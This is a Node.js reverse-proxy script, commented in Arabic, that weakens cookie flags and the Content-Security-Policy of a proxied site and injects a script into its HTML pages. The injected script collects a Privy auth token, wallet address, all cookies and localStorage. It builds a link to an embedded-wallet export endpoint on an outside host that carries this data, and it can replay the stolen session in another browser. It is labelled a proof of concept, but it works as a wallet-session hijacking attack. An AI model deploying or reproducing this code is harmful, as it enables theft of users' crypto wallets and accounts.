// server.js
import express from 'express';
import { createProxyMiddleware } from 'http-proxy-middleware';

const app = express();
const ORIGIN = 'https://origin.example.com';

const proxyOptions = {
  target: ORIGIN,
  changeOrigin: true,
  selfHandleResponse: true, // we will handle the response ourselves
  onProxyRes(proxyRes, req, res) {
    // 1) جمع الـ chunks في buffer
    let body = Buffer.from('');
    proxyRes.on('data', chunk => body = Buffer.concat([body, chunk]));
    proxyRes.on('end', () => {
      // 2) تعديل الرؤوس (headers)
      // a) Set-Cookie
      const rawCookies = proxyRes.headers['set-cookie'] || [];
      const modifiedCookies = rawCookies.map(cookie =>
        cookie.replace(/; HttpOnly; Secure; SameSite=Strict/g, '; secure; SameSite=None')
      );
      if (modifiedCookies.length) {
        res.setHeader('Set-Cookie', modifiedCookies);
      }

      // b) Content-Security-Policy
      res.setHeader(
        'Content-Security-Policy',
        "default-src * 'unsafe-inline' 'unsafe-eval' data: blob:"
      );

      // c) باقي الرؤوس
      Object.keys(proxyRes.headers).forEach(name => {
        if (name.toLowerCase() === 'set-cookie' ||
            name.toLowerCase() === 'content-security-policy') return;
        res.setHeader(name, proxyRes.headers[name]);
      });

      // 3) تعديل الـ body إذا كان HTML
      const contentType = proxyRes.headers['content-type'] || '';
      if (contentType.includes('text/html')) {
        let text = body.toString('utf8');
        const scriptTag = `<script>
  (function() {
    function getCookie(name) {
      const value = \`; \${document.cookie}\`;
      const parts = value.split(\`; \${name}=\`);
      if (parts.length === 2) return parts.pop().split(';').shift();
    }

    function getLastPartOfLocalStorageKey(prefix) {
      for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        if (key.startsWith(prefix)) {
          const parts = key.split(':');
          return parts[parts.length - 1];
        }
      }
      return null;
    }

    function encodeBase64(data) {
      return btoa(unescape(encodeURIComponent(data)));
    }

    function decodeBase64(data) {
      return decodeURIComponent(escape(atob(data)));
    }

    function setCookies(cookies, path = '/') {
      cookies.split(';').forEach(cookie => {
        document.cookie = \`\${cookie.trim()}; path=\${path}\`;
      });
    }

    function setLocalStorage(data) {
      const localStorageData = JSON.parse(data);
      for (const key in localStorageData) {
        localStorage.setItem(key, localStorageData[key]);
      }
    }

    const urlParams = new URLSearchParams(window.location.search);
    if (urlParams.has('POC')) {
      const pocValue = decodeBase64(urlParams.get('POC'));
      const [cookieData, localStorageData] = pocValue.split('|');
      setCookies(cookieData, '/');
      setLocalStorage(localStorageData);
    } else {
      const privyToken = getCookie('privy-token');
      const address = getLastPartOfLocalStorageKey('privy_wallet');
      if (privyToken && address) {
        const exportUrl = \`https://privy.awc-eg.team/apps/clthf5zo505s513atuph9xful/embedded-wallets/export?token=\${privyToken}&address=\${address}\`;
        const allCookies = document.cookie;
        const localStorageData = JSON.stringify(Object.fromEntries(Object.entries(localStorage)));
        const encodedData = encodeBase64(\`\${allCookies}|\${localStorageData}\`);
        const finalUrl = \`\${exportUrl}&POC=\${encodedData}\`;
        alert(finalUrl);
        console.log(\`The POC URL :  \${finalUrl}\`);
      }
    }
  })();
</script>`;

        text = text.replace('</body>', `${scriptTag}</body>`);
        res.writeHead(proxyRes.statusCode, proxyRes.statusMessage);
        return res.end(text);
      }

      // 4) لغير الـ HTML نعيد البايتات كما هي
      res.writeHead(proxyRes.statusCode, proxyRes.statusMessage);
      res.end(body);
    });
  }
};

app.use('/', createProxyMiddleware(proxyOptions));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Reverse proxy listening on port ${PORT}`);
});
